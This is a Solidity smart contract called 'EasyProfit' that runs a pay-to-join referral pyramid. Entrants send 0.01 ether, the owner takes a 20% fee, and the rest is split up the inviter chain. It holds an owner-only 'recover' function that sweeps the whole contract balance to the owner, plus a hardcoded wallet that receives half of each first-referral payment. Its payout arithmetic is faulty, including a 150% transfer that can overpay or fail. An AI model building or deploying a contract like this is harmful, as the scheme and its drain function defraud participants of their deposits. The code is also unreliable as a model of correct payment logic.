// SPDX-License-Identifier: None


pragma solidity ^0.4.26;

import "./SafeMath.sol";

    contract EasyProfit {

    using SafeMath for uint;

            struct Contribution {
                address inviter;
                bool contributed;
                bool paidOut;
                uint referreeCount;
            }

            struct User {
                address  inviter;
                address  self;
            }

    mapping(address => Contribution) public contributions;
    mapping(address => User) public tree;
 

    uint private feePercentage = 20;
    address public owner;
    address public newOwner;
    address public WalletFee;
    
    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() public {
       WalletFee = 0xD31aF35a7E53b5cB84d3bFBC52c74c0856cD90c3;
        tree[msg.sender] = User(msg.sender, msg.sender);
         owner = msg.sender;
           Contribution memory ownerContribution;
            ownerContribution.contributed = true;
             contributions[owner] = ownerContribution; 
    }

    function getBalance() public view onlyOwner returns(uint){
        // returns the contract balance 
        return address(this).balance;
    }

    function getRefereeCount(address addr) public constant returns(uint count) {
        return contributions[addr].referreeCount;
    }
    
    function hasContributed(address addr) public constant returns(bool yes) {
        return contributions[addr].contributed;
    }

    function recover (address) public onlyOwner{
         owner.transfer(address(this).balance);
    }

    function isPaidOut(address addr) public constant returns(bool yes) {
        return contributions[addr].paidOut;
    }


        modifier onlyOwner() {
    require(owner == msg.sender, "You are not the owner");
    _;
        }

    function enter(address inviter) external payable {
        require(msg.value == 1 ether/100, "Must be at least 0,01 ether");    
        
        Contribution storage inviterContribution = contributions[inviter];
        
        // Don't continue if the referrer has not contributed
        if (!inviterContribution.contributed) revert();

        // Don't contribute if this has been paid out
        if(inviterContribution.paidOut) revert();
                        
        // Don't continue if the sender has already contributed
        if (contributions[msg.sender].contributed) revert(); 

        Contribution memory contribution;
        contribution.contributed = true;
        contribution.inviter = inviter;

        uint fee = msg.value.mul(feePercentage).div(100);

        owner.transfer(fee);

        tree[msg.sender] = User(inviter, msg.sender);

        contributions[msg.sender] = contribution;
        
        inviterContribution.referreeCount++;

        address current = inviter;

        uint amount = (msg.value * 80/100);


            if(inviterContribution.referreeCount == 1){

                WalletFee.transfer(amount * 50/100);
    
                } else if (inviterContribution.referreeCount == 2){
                                while(current != owner) {
                                amount = amount.div(2);
                                current.transfer(amount * 150/100);
                                current = tree[current].inviter;
                                }
                            owner.transfer(amount);
                                 
                } else if (inviterContribution.referreeCount >= 3){

                                while(current != owner) {
                                amount = amount.div(2);
                                current.transfer(amount);
                                current = tree[current].inviter;
                                }
                            owner.transfer(amount);
                }
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }

    function acceptOwnership() public {
        require(msg.sender == newOwner);
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }

}